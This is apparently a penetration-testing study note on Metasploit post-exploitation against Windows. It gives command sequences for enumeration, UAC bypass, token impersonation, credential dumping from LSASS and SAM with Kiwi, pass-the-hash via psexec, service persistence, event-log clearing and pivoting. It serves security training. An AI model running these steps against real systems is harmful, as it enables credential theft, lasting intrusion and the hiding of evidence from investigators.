# MSF Windows Post Exploitation Modules

We can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to:
+ Enumerate user privileges
+ Enumerate logged on users
+ VM check
+ Enumerate installed programs
+ Enumerate AVs
+ Enumerate computers connected to domain
+ Enumerate installed patches
+ Enumerate shares





## Local Enumeration

```

search upgrade platform:windows


windows/gather/

# privilege enumeration
search win_privs


# check wheter the target is a Virtual Machine
search checkvm

# Local Enumeration
search enum_logged_on
windows/gather/enum_shares
windows/gather/enable_rdp
windows/gather/enum_computer

windows/gather/enum_applications
windows/gather/enum_av_excluded
windows/gather/enum_patches



```




## Privilege Escalation


### Bypass UAC
We can utilize the "Windows Escalate UAC Protection Bypass (In Memory Injection)" module to bypass UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.






### Token Impersonation With Incognito
Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.

We can use the incognito module to display a list of available tokens that we can impersonate.


The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.

The following are the privileges that are required for a successful impersonation attack:
- `SeAssignPrimaryToken`: This allows a user to impersonate tokens.
- `SeCreateToken`: This allows a user to create an arbitrary token with administrative privileges.
- `SeImpersonatePrivilege`: This allows a user to create a process under the security context of another user typically with administrative privileges.

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_toke "[TOKEN NAME]"
# then you may have to migrate to another process
meterpreter > migrate [PROCESS ID]



```







### Mimikatz
We can utilize the pre-built mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk.

Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM databases, and more.


```
meterpreter > pgrep lsass
meterpreter > migrate [LSASS PROCESS ID]
meterpreter > load kiwi
# (see all kiwi commands in help)
cred_all
lsa_dump_sam
lsa_dump_secrets


```






### Pass-The-Hash

Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.

This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

We can use the `PsExec` module to legitimately authenticate with the target system via SMB.

```
meterpreter > hashdump

use exploit/windows/smb/psexec
	set SMBPass [DUMPED HASH]
	set target Native\ upload
```
















## Establishing Persistence On Windows


Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

Gaining an initial foothold is not enough, you need to setup and maintain

We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.


```
search platform:windows persistence


```


Example:
Use `exploit/windows/local/persistence_service`, then you can reconnect any time using `multi/handler` (user the same options specified in the persistence_service module)












## Clearing tracks / Clearing Windows Event Logs

The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment.

The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event log.

Event logs are categorized based on the type of events they store:
- Application logs: Stores application/program events like startups, crashes etc.
- System logs: Stores system events like startups, reboots etc.
- Security logs: Stores security events like password changes, authentication failures etc.

Event logs can be accessed via the `Event Viewer` on Windows.


```
meterpreter > clearev

meterpreter > rm [UPLOADED FILES]


```










## Pivoting

Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised hostâ€™s private internal network.

After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously.

Meterpreter provides us with the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network.


```
meterpreter > ipconfig

meterpreter > run autoroute -s 10.2.27.0/20

# Now we can run MSF modules to the new added route
# Example: > use auxiliary/scanner/portscan/tcp [victim 2 IP]

# Use port forwarding
meterpreter > portfwd add -l [LOCAL PORT] -p [victim 2 PORT] -r [victim 2 IP]

# then we can use nmap
db_nmap -sS -sV -p [LOCAL PORT forwaded] localhost


```

for a exploit in the victim 2 use `bind_tcp` instead of `reverse_tcp` payload




